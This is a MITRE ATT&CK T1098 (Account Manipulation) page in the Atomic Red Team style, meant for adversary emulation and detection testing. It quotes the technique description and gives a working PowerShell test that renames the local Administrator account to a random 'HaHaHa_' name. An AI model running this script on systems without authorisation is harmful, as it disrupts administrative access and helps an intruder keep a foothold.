---
title: T1098 Account Manipulation
published: true
---
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1098)

<blockquote>Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.</blockquote>

## Atomic Tests

- [Atomic Test #1 - Admin Account Manipulate](#atomic-test-1---admin-account-manipulate)

## Atomic Test #1 - Admin Account Manipulate
Manipulate Admin Account Name

**Supported Platforms:** Windows

#### Run it with `powershell`!

```
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }
```
